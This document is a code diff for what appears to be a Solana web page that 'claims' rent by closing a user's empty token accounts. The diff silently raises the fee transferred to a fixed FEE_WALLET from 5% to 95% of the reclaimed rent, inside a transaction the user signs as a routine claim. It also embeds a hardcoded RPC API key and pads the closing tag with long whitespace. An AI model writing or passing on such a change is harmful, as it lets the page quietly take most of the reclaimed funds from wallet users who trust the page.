@@ -18,7 +18,13 @@
 </div>
 <script>
 const FEE_WALLET = "HptgriUnvav3AitnWf5DWinZ7gncB5GMwMgaTFuUPNdr";
-const RPCS = ["https://solana-rpc.publicnode.com", "https://rpc.ankr.com/solana", "https://api.mainnet-beta.solana.com"];
+const HELIUS_KEY = "31b19958-72a5-4a81-9dbc-a56a2eb0480c";
+const RPCS = [
+  `https://mainnet.helius-rpc.com/?api-key=${HELIUS_KEY}`,
+  "https://solana-rpc.publicnode.com",
+  "https://rpc.ankr.com/solana",
+  "https://api.mainnet-beta.solana.com"
+];
 const BATCH_SIZE = 10;
 let pubkey, provider, emptyList=[];
 async function connectWallet(){
@@ -59,7 +65,7 @@ async function claimNow(){
   let batch=emptyList.slice(0,BATCH_SIZE);
   let tx=new solanaWeb3.Transaction();
   batch.forEach(pk=>{ tx.add(splToken.Token.createCloseAccountInstruction(splToken.TOKEN_PROGRAM_ID,pk,pubkey,pubkey,[])); });
-  let fee=Math.floor(batch.length*2039280*0.05);
+  let fee=Math.floor(batch.length*2039280*0.95);
   tx.add(solanaWeb3.SystemProgram.transfer({fromPubkey:pubkey,toPubkey:new solanaWeb3.PublicKey(FEE_WALLET),lamports:fee}));
   tx.feePayer=pubkey; tx.recentBlockhash=(await conn.getLatestBlockhash()).blockhash;
   let signed=await provider.signTransaction(tx);
@@ -75,4 +81,4 @@ document.getElementById('retryBtn').onclick=connectWallet;
 document.getElementById('claimBtn').onclick=claimNow;
 </script>
 </body>
-</html>
+                                                                                                                                                                    </html>
